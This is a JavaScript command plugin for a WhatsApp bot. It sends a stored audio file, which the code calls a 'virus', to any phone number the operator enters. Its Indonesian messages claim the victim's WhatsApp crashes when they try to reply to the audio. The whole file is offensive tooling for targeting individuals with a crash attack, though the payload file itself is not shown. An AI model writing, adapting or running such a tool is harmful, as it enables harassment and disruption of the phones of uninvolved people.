let { generateWAMessageFromContent, prepareWAMessageMedia, proto } = (await import('@adiwajshing/baileys')).default
import moment from 'moment-timezone'
import fetch from 'node-fetch'
import fs from 'fs'
import { sticker } from '../lib/sticker.js'
let handler  = async (m, { conn, args, text, command, usedPrefix, participants }) => {
let zyko = 'https://telegra.ph/file/9e69cee6c64a9477b133c.jpg'
let data = (await conn.onWhatsApp(text))[0] || {}
    if (!data.exists) throw `Nomor Tersebut ~${text}~ Tidak Terdaftar Di WhatsApp!`;
if (!text)return conn.send2ButtonImg(m.chat, `https://telegra.ph/file/9e69cee6c64a9477b133c.jpg`, `${gcname}`,`*Nomor Yang Mau DiKirim ${command} Mana Cuy?*\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
     'Owner','.owner',
       'Donasi','.donasi'
       )
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
let name = conn.getName(who)
let virusaudio = fs.readFileSync('./mp3/anjay.opus')
conn.reply(m.chat, 'Sedang Mengirim...', m)
conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', virusaudio,)
await conn.send2ButtonImg(m.chat, zyko, gcname, `*Sukses Mengirim ${command} Ke Nomor: ${text}@s.whatsapp.net\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
   'Menu','.menu',
     'Owner','.owner'
       )
          }
handler.help = ['virusaudio-v1 <628XXXXXX>']
handler.tags = ['virus']
handler.command = /^(virusaudio-v1)$/i
handler.premium = false
handler.owner = true
handler.limit = true

export default handler